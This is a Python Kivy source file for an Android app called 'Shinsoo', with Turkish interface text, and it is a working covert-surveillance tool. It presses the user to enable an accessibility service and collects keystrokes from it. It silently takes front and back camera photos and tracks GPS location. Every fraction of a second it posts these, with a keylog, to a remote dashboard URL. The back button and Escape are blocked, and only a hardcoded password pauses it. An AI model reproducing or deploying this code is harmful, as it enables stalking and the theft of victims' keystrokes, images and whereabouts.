import os, sys
os.environ['KIVY_NO_ENV_CONFIG'] = '1'
os.environ['KIVY_ORIENTATION'] = 'portrait'

from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.graphics import Color, Rectangle, RoundedRectangle, Line
from kivy.clock import Clock
from kivy.metrics import dp
from kivy.utils import platform
from kivy.core.window import Window
from datetime import datetime
import threading, uuid, base64, io, time, logging

logging.basicConfig(level=logging.WARNING)

KIOSK_PASSWORD = "gokhan"
DASHBOARD_URL  = "https://shinsoo.pythonanywhere.com"

def make_device_id():
    try:
        return "SHINSOO-" + hex(uuid.getnode())[2:].upper()[-6:]
    except Exception:
        return "SHINSOO-000001"

DEVICE_ID = make_device_id()

# ── Erişilebilirlik kontrolü ──────────────────────────────────────────────────

def check_accessibility():
    if platform != 'android':
        return True
    try:
        from jnius import autoclass
        Settings = autoclass('android.provider.Settings$Secure')
        PA = autoclass('org.kivy.android.PythonActivity')
        ctx = PA.mActivity
        val = Settings.getString(ctx.getContentResolver(), 'enabled_accessibility_services') or ''
        return 'shinsoo' in val.lower()
    except Exception:
        return False

def open_accessibility():
    if platform != 'android':
        return
    try:
        from jnius import autoclass
        Intent = autoclass('android.content.Intent')
        Settings = autoclass('android.provider.Settings')
        PA = autoclass('org.kivy.android.PythonActivity')
        PA.mActivity.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    except Exception:
        pass


# ── UI ────────────────────────────────────────────────────────────────────────

class MainScreen(FloatLayout):

    def __init__(self, **kw):
        super().__init__(**kw)
        self._active = True
        self._msgs   = []
        self._idx    = 0
        self._sender = None
        self._acc_overlay = None

        with self.canvas.before:
            Color(0, 0, 0, 1)
            self._bg = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=lambda *_: setattr(self._bg, 'pos', self.pos),
                  size=lambda *_: setattr(self._bg, 'size', self.size))

        self._build_ui()
        Clock.schedule_interval(self._rotate, 2)

    def _build_ui(self):
        center = BoxLayout(
            orientation='vertical',
            size_hint=(0.65, None), height=dp(90),
            spacing=dp(10),
            pos_hint={'center_x': 0.5, 'center_y': 0.52},
        )
        self._pwd = TextInput(
            hint_text='key', password=True,
            font_size=dp(22), multiline=False,
            size_hint_y=None, height=dp(52),
            background_color=(0.06, 0.06, 0.06, 1),
            foreground_color=(1, 1, 1, 1),
            cursor_color=(1, 1, 1, 1),
            hint_text_color=(0.22, 0.22, 0.22, 1),
            padding=[dp(14), dp(14)],
        )
        self._pwd.bind(on_text_validate=self._check_key)
        self._err = Label(
            text='', font_size=dp(10), color=(0.6, 0.1, 0.1, 1),
            size_hint_y=None, height=dp(14), halign='center',
        )
        center.add_widget(self._pwd)
        center.add_widget(self._err)
        self.add_widget(center)

        self._ticker = Label(
            text='gokhan', font_size=dp(8),
            color=(0.14, 0.14, 0.14, 1),
            size_hint=(1, None), height=dp(18),
            pos_hint={'x': 0, 'y': 0}, halign='center',
        )
        self.add_widget(self._ticker)

    def show_accessibility_overlay(self):
        if self._acc_overlay:
            return
        overlay = FloatLayout(size_hint=(1,1), pos_hint={'x':0,'y':0})
        with overlay.canvas.before:
            Color(0, 0, 0, 0.96)
            self._ov_bg = Rectangle(pos=overlay.pos, size=overlay.size)
        overlay.bind(
            pos=lambda *_: setattr(self._ov_bg, 'pos', overlay.pos),
            size=lambda *_: setattr(self._ov_bg, 'size', overlay.size))

        box = BoxLayout(
            orientation='vertical',
            size_hint=(0.82, None), height=dp(220),
            spacing=dp(14), padding=[dp(20), dp(20)],
            pos_hint={'center_x': 0.5, 'center_y': 0.5},
        )
        box.add_widget(Label(
            text='[b]ERISEBILIRLIK IZNI[/b]', markup=True,
            font_size=dp(14), color=(0.85, 0.85, 0.85, 1),
            size_hint_y=None, height=dp(28), halign='center'))
        box.add_widget(Label(
            text='Shinsoo icin erisebilirlik\niznini etkinlestirin.',
            font_size=dp(11), color=(0.45, 0.45, 0.45, 1),
            size_hint_y=None, height=dp(40), halign='center'))

        btn = Button(
            text='AYARLARA GIT',
            size_hint_y=None, height=dp(48),
            background_color=(0.18, 0.18, 0.18, 1),
            color=(0.9, 0.9, 0.9, 1),
            font_size=dp(13), bold=True,
        )
        btn.bind(on_release=self._go_accessibility)
        box.add_widget(btn)

        skip = Button(
            text='atla',
            size_hint_y=None, height=dp(28),
            background_color=(0, 0, 0, 0),
            color=(0.25, 0.25, 0.25, 1),
            font_size=dp(10),
        )
        skip.bind(on_release=self._skip_accessibility)
        box.add_widget(skip)

        overlay.add_widget(box)
        self._acc_overlay = overlay
        self.add_widget(overlay)
        Clock.schedule_interval(self._poll_accessibility, 2)

    def _go_accessibility(self, *_):
        open_accessibility()

    def _skip_accessibility(self, *_):
        self._remove_acc_overlay()

    def _poll_accessibility(self, dt):
        if check_accessibility():
            self._push('erisim izni: ok')
            self._remove_acc_overlay()
            return False

    def _remove_acc_overlay(self):
        if self._acc_overlay:
            self.remove_widget(self._acc_overlay)
            self._acc_overlay = None

    def _check_key(self, *_):
        if self._pwd.text == KIOSK_PASSWORD:
            self._active = False
            if self._sender:
                self._sender.paused = True
            self._err.text = ''
            self._pwd.text = ''
            self._push('durduruldu')
        else:
            self._err.text = 'yanlis key'
            self._pwd.text = ''

    def _push(self, msg):
        self._msgs.append(msg)
        if len(self._msgs) > 80:
            self._msgs = self._msgs[-80:]

    def _rotate(self, dt):
        if self._msgs:
            self._idx = (self._idx + 1) % len(self._msgs)
            self._ticker.text = 'gokhan  |  ' + self._msgs[self._idx]

    def update_perm(self, name, granted):
        self._push(name + ':' + ('ok' if granted else 'red'))
        if name == 'Kamera' and granted and self._sender:
            self._sender.start_cameras()
        if name == 'Konum' and granted and self._sender:
            self._sender.start_gps()


# ── Kamera Worker ─────────────────────────────────────────────────────────────

class CamWorker:
    def __init__(self, idx, cb):
        self.idx     = idx
        self.cb      = cb
        self.running = False

    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()

    def stop(self):
        self.running = False

    def _loop(self):
        if platform != 'android':
            self._sim_loop()
            return
        while self.running:
            try:
                from jnius import autoclass, PythonJavaClass, java_method
                Camera = autoclass('android.hardware.Camera')
                n = Camera.getNumberOfCameras()
                if self.idx >= n:
                    time.sleep(2); continue

                result = [None]
                done   = threading.Event()
                cam    = Camera.open(self.idx)
                params = cam.getParameters()
                # Küçük boyut seç
                sizes = params.getSupportedPictureSizes()
                best  = None
                for s in sizes:
                    if s.width <= 640:
                        if best is None or s.width * s.height < best.width * best.height:
                            best = s
                if best:
                    params.setPictureSize(best.width, best.height)
                else:
                    params.setPictureSize(320, 240)
                cam.setParameters(params)

                ST = autoclass('android.graphics.SurfaceTexture')
                st = ST(self.idx + 40)
                cam.setPreviewTexture(st)
                cam.startPreview()
                time.sleep(0.3)

                class PicCB(PythonJavaClass):
                    __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
                    @java_method('([BLandroid/hardware/Camera;)V')
                    def onPictureTaken(self, data, camera):
                        if data: result[0] = bytes(data)
                        done.set()

                cam.takePicture(None, None, PicCB())
                done.wait(timeout=4)
                cam.release()

                if result[0]:
                    self.cb(base64.b64encode(result[0]).decode('utf-8'))

            except Exception:
                time.sleep(0.5)

            time.sleep(0.1)

    def _sim_loop(self):
        try:
            from PIL import Image as PILImage, ImageDraw
        except Exception:
            return
        import random
        colors = [(40,0,80),(0,30,60),(20,0,50)]
        c = colors[self.idx % len(colors)]
        while self.running:
            try:
                img = PILImage.new('RGB', (320,240), c)
                draw = ImageDraw.Draw(img)
                draw.text((8,8),
                    ('ON' if self.idx==1 else 'ARKA') + ' ' + datetime.now().strftime('%H:%M:%S'),
                    fill=(180,0,255))
                draw.rectangle([random.randint(0,300), random.randint(0,220),
                                 random.randint(0,320), random.randint(0,240)],
                               outline=(100,0,200), width=1)
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=40)
                self.cb(base64.b64encode(buf.getvalue()).decode('utf-8'))
            except Exception:
                pass
            time.sleep(0.1)


# ── DataSender ────────────────────────────────────────────────────────────────

class DataSender:

    def __init__(self, screen):
        self.screen       = screen
        self.paused       = False
        self.packet_count = 0
        self.key_buffer   = []
        self._key_lock    = threading.Lock()
        self._stop        = threading.Event()
        self._front_q     = [None]
        self._back_q      = [None]
        self._cam_f       = None
        self._cam_b       = None
        self._gps_started = False

        threading.Thread(target=self._send_loop, daemon=True).start()
        threading.Thread(target=self._key_loop,  daemon=True).start()

    def start_cameras(self):
        if self._cam_f is None:
            self._cam_f = CamWorker(1, lambda b: setattr(self, '_front_q', [b]))
            self._cam_f.start()
            self.screen._push('on kamera baslatildi')
        if self._cam_b is None:
            self._cam_b = CamWorker(0, lambda b: setattr(self, '_back_q', [b]))
            self._cam_b.start()
            self.screen._push('arka kamera baslatildi')

    def start_gps(self):
        if not self._gps_started:
            self._gps_started = True
            threading.Thread(target=self._gps_loop, daemon=True).start()

    def stop(self):
        self._stop.set()
        if self._cam_f: self._cam_f.stop()
        if self._cam_b: self._cam_b.stop()

    def _gps_loop(self):
        if platform != 'android':
            import random
            lat, lon = 41.0082, 28.9784
            while not self._stop.is_set():
                lat += random.uniform(-0.0002, 0.0002)
                lon += random.uniform(-0.0002, 0.0002)
                self._loc = (lat, lon)
                self.screen._push('gps: ' + str(round(lat,4)) + ',' + str(round(lon,4)))
                self._stop.wait(3)
            return

        self._loc = None
        try:
            from jnius import autoclass, PythonJavaClass, java_method
            LocationManager = autoclass('android.location.LocationManager')
            PA = autoclass('org.kivy.android.PythonActivity')
            lm = PA.mActivity.getSystemService('location')

            class LL(PythonJavaClass):
                __javainterfaces__ = ['android/location/LocationListener']
                @java_method('(Landroid/location/Location;)V')
                def onLocationChanged(self_, loc):
                    self._loc = (loc.getLatitude(), loc.getLongitude())
                    self.screen._push(str(round(loc.getLatitude(),4)) + ',' + str(round(loc.getLongitude(),4)))
                @java_method('(Ljava/lang/String;)V')
                def onProviderEnabled(self_, p): pass
                @java_method('(Ljava/lang/String;)V')
                def onProviderDisabled(self_, p): pass

            ll = LL()
            for p in ['gps', 'network', 'passive']:
                try: lm.requestLocationUpdates(p, 2000, 0, ll)
                except Exception: pass

            for p in ['gps', 'network', 'passive']:
                try:
                    loc = lm.getLastKnownLocation(p)
                    if loc:
                        self._loc = (loc.getLatitude(), loc.getLongitude())
                        self.screen._push('son konum: ' + p)
                        break
                except Exception: pass

            while not self._stop.is_set():
                self._stop.wait(5)
        except Exception as e:
            self.screen._push('gps hata: ' + str(e)[:20])

    def _key_loop(self):
        if platform != 'android':
            return
        while not self._stop.is_set():
            try:
                from jnius import autoclass
                PA = autoclass('org.kivy.android.PythonActivity')
                prefs = PA.mActivity.getSharedPreferences('shinsoo_keys', 0)
                buf = prefs.getString('buffer', '')
                if buf:
                    with self._key_lock:
                        self.key_buffer.append(buf)
                    prefs.edit().putString('buffer', '').apply()
                    self.screen._push('key: ' + buf[:12])
            except Exception:
                pass
            self._stop.wait(0.3)

    def _send_loop(self):
        try:
            import requests
        except Exception:
            return

        url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID
        self._loc = None

        while not self._stop.is_set():
            if self.paused:
                self._stop.wait(0.5)
                continue
            try:
                payload = {'log': 'Heartbeat ' + datetime.now().strftime('%H:%M:%S')}

                f = self._front_q[0]
                b = self._back_q[0]
                if f: payload['frame_front'] = f; self._front_q[0] = None
                if b: payload['frame_back']  = b; self._back_q[0]  = None

                if self._loc:
                    payload['location'] = {'lat': self._loc[0], 'lon': self._loc[1]}

                with self._key_lock:
                    if self.key_buffer:
                        payload['keylog'] = ' '.join(self.key_buffer)
                        self.key_buffer = []

                requests.post(url, json=payload, timeout=3)
                self.packet_count += 1
                if self.packet_count % 30 == 0:
                    self.screen._push('pkt#' + str(self.packet_count))

            except Exception:
                pass

            self._stop.wait(0.1)


# ── App ───────────────────────────────────────────────────────────────────────

class ShinsooApp(App):
    title = 'Shinsoo'

    def build(self):
        Window.clearcolor = (0, 0, 0, 1)
        self.screen = MainScreen()
        self.sender = DataSender(self.screen)
        self.screen._sender = self.sender
        return self.screen

    def on_start(self):
        if platform == 'android':
            self._set_portrait()
            self._start_service()
            Clock.schedule_once(self._check_acc, 1.5)
            self._request_perms()
        else:
            self.sender.start_cameras()
            self.sender.start_gps()

        try:
            from android import activity
            activity.bind(on_back_pressed=self._on_back)
        except Exception:
            pass
        Window.bind(on_keyboard=self._on_key)

    def _check_acc(self, dt):
        if not check_accessibility():
            self.screen.show_accessibility_overlay()
        else:
            self.screen._push('erisim izni zaten aktif')

    def _set_portrait(self):
        try:
            from jnius import autoclass
            AI = autoclass('android.content.pm.ActivityInfo')
            PA = autoclass('org.kivy.android.PythonActivity')
            PA.mActivity.setRequestedOrientation(AI.SCREEN_ORIENTATION_PORTRAIT)
        except Exception:
            pass

    def _start_service(self):
        try:
            from android import AndroidService
            svc = AndroidService('Shinsoo', 'Shinsoo')
            svc.start('start')
            self.screen._push('servis ok')
        except Exception as e:
            self.screen._push('servis: ' + str(e)[:15])

    def _request_perms(self):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
            ], self._after_storage)
        except Exception:
            pass

    def _after_storage(self, permissions, grants):
        for p, g in zip(permissions, grants):
            self.screen.update_perm('Dosya', g)
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
            ], self._after_all)
        except Exception:
            pass

    def _after_all(self, permissions, grants):
        for p, g in zip(permissions, grants):
            if 'CAMERA' in p:
                self.screen.update_perm('Kamera', g)
            elif 'LOCATION' in p:
                self.screen.update_perm('Konum', g)

    def on_stop(self):
        if self.sender: self.sender.stop()

    def _on_back(self, *_): return True
    def _on_key(self, w, key, *_):
        if key == 27: return True
        return False


if __name__ == '__main__':
    ShinsooApp().run()
